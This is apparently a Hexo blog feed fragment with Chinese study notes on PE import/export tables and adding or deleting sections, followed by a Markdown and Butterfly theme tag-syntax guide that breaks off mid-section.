src="https://s2.loli.net/2023/12/12/YAfSmIR19C5wlrN.png" alt="IMAGE_IMPORT_DESCRIPTOR" /><p>一个库就对应了一个IMAGE_IMPORT_DESCRIPTOR结构体，所有需要导入的库的所有结构体形成了数组，最后以NULL结构体结束。</p><p>其中的重要成员是：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">OriginalFirstThunk:</span>导入名称表(该表是指向函数名的指针数组）INT  地址rva(注意该值和characteristics是一个联合)</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">Name:</span>库名称字符串地址rva</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">FirsThunk:</span>导入地址表(该表是指向函数地址的指针数组)IAT地址rva</span><br></pre></td></tr></table></figure><p>作用方式：</p><p>编译时，INT被创建，每个库都把指向不同函数名的指针(指向字符串)写入INT表和IAT表，运行时，程序先查找绑定输入表，然后根据信息在INT地址找到函数名，把函数地址写入IAT，供后续使用。</p><p>此结构体数组被储存在PE体中，但PE头中IMAGE_OPTIONAL_HEADER32OR64.DataDirectory[1].VirtualAddress是该结构体数组的起始位置（RVA）（前4字节），后4字节是大小。</p><h4 id="EAT">EAT:</h4><p>导出地址表</p><p>IMAGE_EXPORT_DIRECTORY:</p><img src="https://s2.loli.net/2023/12/12/9y6bau1iTYPIhfH.png" alt="IMAGE_EXPORT_DIRECTORY" /><p>同上，每个模块(dll)都有一个结构体，一起构成数组，重要成员有：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">NumberOfFuctions:</span>实际导出函数个数</span><br><span class="line"></span><br><span class="line"><span class="symbol">NumberOfNames:</span>导出函数中具名的函数个数(显式命名)</span><br><span class="line"></span><br><span class="line"><span class="symbol">AddressOfFunctions:</span>导出函数地址数组，含有入口地址，个数为NumberOfFunctions</span><br><span class="line"></span><br><span class="line"><span class="symbol">AddressOfNames:</span>函数名称地址数组，有指向全部导出函数入口地址的rva，个数为NumberOfNames</span><br><span class="line"></span><br><span class="line"><span class="symbol">AddressOfNameOrdinals:</span>存该dll中的函数的序号（ordinal）</span><br><span class="line"></span><br><span class="line"><span class="symbol">Name:</span>是指向模块（dll）在内存中的相同名称地址的指针，地址为RVA</span><br><span class="line"></span><br><span class="line"><span class="symbol">Base:</span>序号的基准值，序号减base值来调用这个模块</span><br></pre></td></tr></table></figure><p>作用方式：</p><p>1）通过名称：当程序发现一个函数调用不在内部时，会查找dll是否包含这个函数，如果包含，就会用名称先从AddressOfNames中比较寻找所需函数地址，用得到的索引再在AddressOfNameOrdinals中得到序号，用序号在AddressOfFunctions找到对应的地址进入。然后就会连接地址与这个函数。之所以这么麻烦是因为一个函数可能被多个程序使用，一个程序也可能使用多个动态链接库。查找名称也可以保证即使有新版本，旧编译的程序也可以调用这个函数。</p><p>该结构体数组存在在PE体中，RVA存在于DataDirectory[1].VirtualAddress（前4字节），后4字节是大小。</p><h3 id="关于修改PE文件">关于修改PE文件</h3><p>添加节区：</p><p>添加节区首先要加节区头，使文件能识别到这个节区，由于一个节区头大小为40字节（</p><p><code>节表起始位置 = DOS头的e_lfanew字段值 + sizeof(IMAGE_NT_HEADERS)</code></p><p><code>节表大小 = 文件头的NumberOfSections字段值 * sizeof(IMAGE_SECTION_HEADER)</code></p><p>用这个公式计算节表后是否<strong>大于</strong>40字节，防止截断，如果可以放入一个节区头就放入，如果不行，一般有两种方法：一个是删掉dos存根，把后面的pe头部分前移，在后面的位置加节区头，这时要注意IMAGE_DOS_HEADER 的e_flanew要修改为NT头的偏移，因为NT头移动过，不过不用管对齐，因为并没有更改文件大小和节区位置，只要注意后面加的节区就可以了。第二个是在节表后面加数据，让它变长，这就要在SizeOfHeader里面增加字节，在多出来的地方写节区头，但是这样要把每个节区头里的偏移调到对应的偏移，因为节区头数据变多之后，节区的地址相应增加了那么多。但要注意增加的字节必须要对齐为最小单位的倍数。</p><p>还要把NumberOfSections+1，可选头中的sizeOfImage加对应的值</p><p>删除节区：</p><blockquote><p>直接0填充对应节区头，就识别不到节区啦。然后要把NumberOfSections-1.</p></blockquote><p>倒是可以这样，但是真的要删除节区的话，参考《逆核》17.2.2删除.reloc节区(位于整个文件的最后)：</p><span class='p red'>注</span>:这里使用的是exe文件,因为一般exe文件没用重定位节也可以正常运行<ol><li>从节区头找到reloc节区起始偏移，跳转后删除(物理)</li><li>文件头中有Number of Section填入减1的值(删了几个就减几)</li><li>可选头中有整个记录映像大小的Size of Image,在节区头中找到.reloc节区的大小RawDataSize让映像大小的值减去这个值</li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法与外挂标签写法汇总</title>
      <link href="/posts/2013454d.html"/>
      <url>/posts/2013454d.html</url>
      
        <content type="html"><![CDATA[<h1>1.Markdown语法自带格式</h1><div class="note info flat"><p>参考：<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a></p></div><div class="note warning flat"><p>注意：此页面偶尔会存在CSS冲突问题!</p></div><h2 id="1-1-代码块">1.1 代码块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-2-多级标题">1.2 多级标题</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>见本文章标题!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-3-文字样式">1.3 文字样式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>这里的背景色是：MistyRosen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<s>删除</s>线演示</p><p><font size = 5>5号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>上述要点可参考:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">【Markdown语法】字体颜色大小及文字底色设置</a></p></div><h2 id="1-4-引用">1.4 引用</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>Java<br>二级引用演示<br>MySQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>(引用内部一样可以用格式)</p></blockquote><p>…</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-5-分割线">1.5 分割线</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><hr><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-6-列表-跟空格都可以">1.6 列表(*,+,-跟空格都可以)</h2><h3 id="1-6-1-无序列表">1.6.1 无序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-6-2-有序列表">1.6.2 有序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 注意后面有空格</span></span><br><span class="line"><span class="bullet">1.</span> </span><br><span class="line"><span class="bullet">2.</span> </span><br><span class="line"><span class="bullet">3.</span> </span><br><span class="line"><span class="bullet">4.</span> </span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li></li><li></li><li></li><li></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-7-图片">1.7 图片</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 本地图片</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># 在线图片</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>本地图片:<br><img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /><br>在线图片:<br><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-8-表格">1.8 表格</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 项目标号 | 资金     | 备注 |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100，000 | 无   |</span><br><span class="line">| 2        | 200，000 | 无   |</span><br><span class="line">| 3        | 300,600  | 重要 |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th>项目标号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100，000</td><td>无</td></tr><tr><td>2</td><td>200，000</td><td>无</td></tr><tr><td>3</td><td>300,600</td><td>重要</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-9-公式">1.9 公式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>2.Butterfly外挂标签</h1><div class="note info flat"><p>这部分参考安知鱼:<a href="https://anzhiy.cn/posts/7d58.html">基于Butterfly的外挂标签引入</a></p></div><h2 id="2-1-行内文本样式-text">2.1 行内文本样式 text</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-2-行内文本-span">2.2 行内文本 span</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-3-段落文本-p">2.3 段落文本 p</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。</li></ul><p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-4-引用note">2.4 引用note</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">通用配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">语法格式</button></li><li class="tab"><button type="button" data-href="#分栏-3">参数配置</button></li><li class="tab"><button type="button" 